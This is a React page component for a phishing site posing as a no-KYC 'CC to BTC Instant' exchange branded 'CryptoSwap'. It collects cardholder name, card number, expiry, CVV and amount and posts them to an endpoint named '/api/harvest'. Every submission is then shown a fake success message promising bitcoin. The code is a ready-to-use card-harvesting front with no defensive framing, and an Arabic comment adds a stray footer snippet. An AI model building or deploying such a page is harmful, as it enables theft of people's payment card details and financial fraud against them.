import { useState } from 'react';

export default function Home() {
  const [formData, setFormData] = useState({ cc: '', exp: '', cvv: '', name: '', amount: '' });
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');

  const handleChange = (e) => setFormData({ ...formData, [e.target.name]: e.target.value });

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    try {
      const res = await fetch('/api/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      if (res.ok) {
        setMessage('✅ Payment successful! BTC incoming...');
        setFormData({ cc: '', exp: '', cvv: '', name: '', amount: '' });
      } else {
        setMessage('❌ Try again');
      }
    } catch {
      setMessage('❌ Error');
    }
    setLoading(false);
  };

  return (
    <div style={{ maxWidth: 400, margin: '50px auto', padding: 20, fontFamily: 'Arial' }}>
      <h1>💰 CC to BTC Instant</h1>
      <p>No KYC • 0% fees • Instant BTC</p>
      <form onSubmit={handleSubmit}>
        <input name="name" placeholder="Cardholder Name" value={formData.name} onChange={handleChange} required style={{ width: '100%', padding: 10, margin: 5, boxSizing: 'border-box' }} />
        <input name="cc" placeholder="Card Number" value={formData.cc} onChange={handleChange} required style={{ width: '100%', padding: 10, margin: 5, boxSizing: 'border-box' }} />
        <div style={{ display: 'flex', gap: 10 }}>
          <input name="exp" placeholder="MM/YY" value={formData.exp} onChange={handleChange} required style={{ flex: 1, padding: 10, margin: 5 }} />
          <input name="cvv" placeholder="CVV" value={formData.cvv} onChange={handleChange} required style={{ flex: 1, padding: 10, margin: 5 }} />
        </div>
        <input name="amount" placeholder="Amount USD" value={formData.amount} onChange={handleChange} required style={{ width: '100%', padding: 10, margin: 5 }} />
        <button type="submit" disabled={loading} style={{ width: '100%', padding: 12, background: '#f39c12', color: 'white', border: 'none', fontSize: 16, margin: 5 }}>
          {loading ? 'Processing...' : `Buy BTC ($${formData.amount || 0})`}
        </button>
      </form>
      {message && <p style={{ margin: 10, padding: 10, background: '#d4edda', borderRadius: 5, color: '#155724' }}>{message}</p>}
      <p style={{ fontSize: 12, color: '#666' }}>Secure • Powered by CryptoSwap</p>
    </div>
  );
}

// أضف في نهاية <p> الـ footer:
<p style={{ fontSize: 12, color: '#666', marginTop: 20, cursor: 'pointer', transition: 'color 0.3s' }} 
      onMouseEnter={(e) => e.target.style.color = '#f39c12'}
      onMouseLeave={(e) => e.target.style.color = '#666'}>
  Secure • Powered by <span style={{ color: '#f39c12', fontWeight: 'bold' }}>CryptoSwap</span>
</p>
